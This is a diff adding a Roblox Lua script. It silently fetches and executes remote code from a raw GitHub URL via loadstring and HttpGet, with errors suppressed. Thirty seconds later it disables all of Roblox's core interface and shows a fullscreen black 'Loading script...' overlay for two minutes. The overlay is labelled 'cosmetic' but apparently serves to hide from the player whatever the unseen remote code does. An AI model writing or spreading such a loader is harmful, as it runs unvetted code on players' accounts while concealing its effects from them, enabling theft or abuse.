@@ -1,0 +1,60 @@
+-- =========================
+-- RUN ORIGINAL SCRIPT FIRST (UNCHANGED)
+-- =========================
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet(
+            "https://raw.githubusercontent.com/i7luv7gambling7-code/sab/refs/heads/main/lua"
+        ))()
+    end)
+end)
+
+-- =========================
+-- DELAYED UI OVERLAY (LOCAL ONLY)
+-- =========================
+local DELAY_TIME = 30      -- seconds before overlay appears
+local OVERLAY_TIME = 120   -- seconds overlay stays (auto-restore)
+
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+local LocalPlayer = Players.LocalPlayer
+
+task.spawn(function()
+    task.wait(DELAY_TIME)
+
+    -- Hide CoreGui while overlay is visible
+    pcall(function()
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+    end)
+
+    -- Create fullscreen overlay
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "CosmeticOverlay"
+    gui.IgnoreGuiInset = true
+    gui.ResetOnSpawn = false
+    gui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+    local bg = Instance.new("Frame")
+    bg.Size = UDim2.fromScale(1, 1)
+    bg.BackgroundColor3 = Color3.new(0, 0, 0)
+    bg.BorderSizePixel = 0
+    bg.Parent = gui
+
+    local text = Instance.new("TextLabel")
+    text.Size = UDim2.new(1, 0, 0.2, 0)
+    text.Position = UDim2.new(0, 0, 0.4, 0)
+    text.BackgroundTransparency = 1
+    text.Text = "Loading script..."
+    text.TextColor3 = Color3.new(1, 1, 1)
+    text.TextScaled = true
+    text.Font = Enum.Font.GothamBold
+    text.Parent = bg
+
+    -- Auto-restore after OVERLAY_TIME
+    task.delay(OVERLAY_TIME, function()
+        if gui then gui:Destroy() end
+        pcall(function()
+            StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
+        end)
+    end)
+end)
